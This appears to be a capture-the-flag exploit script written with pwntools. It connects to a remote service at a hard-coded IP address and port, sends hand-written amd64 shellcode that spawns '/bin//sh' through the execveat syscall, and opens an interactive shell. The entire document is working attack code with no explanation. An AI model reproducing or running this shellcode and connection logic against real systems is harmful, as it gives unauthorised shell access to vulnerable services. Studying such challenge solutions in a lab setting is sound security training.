from pwn import *
context.arch='amd64'
context.log_level='DEBUG'
p=remote("116.62.247.145",10102)
shellasm='''
push 0x42
pop  rax
inc  ah
cqo
push rdx
movabs rdi,0x68732f2f6e69622f
push rdi
push rsp
pop  rsi
mov  r8,rdx
mov  r10,rdx
syscall
'''
shellcode=asm(shellasm)
p.sendline(shellcode)
p.interactive()